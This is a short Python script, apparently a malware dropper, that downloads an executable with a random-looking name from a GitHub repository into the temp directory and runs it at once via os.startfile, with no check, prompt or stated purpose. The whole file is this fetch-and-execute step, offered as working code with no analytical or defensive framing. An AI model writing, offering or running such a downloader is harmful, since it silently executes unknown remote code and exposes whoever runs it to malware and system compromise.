import os
import urllib.request
import tempfile

EXE_URL = "https://github.com/Prenda00/canlmiop/raw/refs/heads/main/dikduid.exe"
EXE_NAME = "dikduid.exe"

def main():
    tempdir = tempfile.gettempdir()
    exe_path = os.path.join(tempdir, EXE_NAME)

    with urllib.request.urlopen(EXE_URL) as r:
        data = r.read()
    with open(exe_path, "wb") as f:
        f.write(data)

    os.startfile(exe_path)

if __name__ == "__main__":
    main()
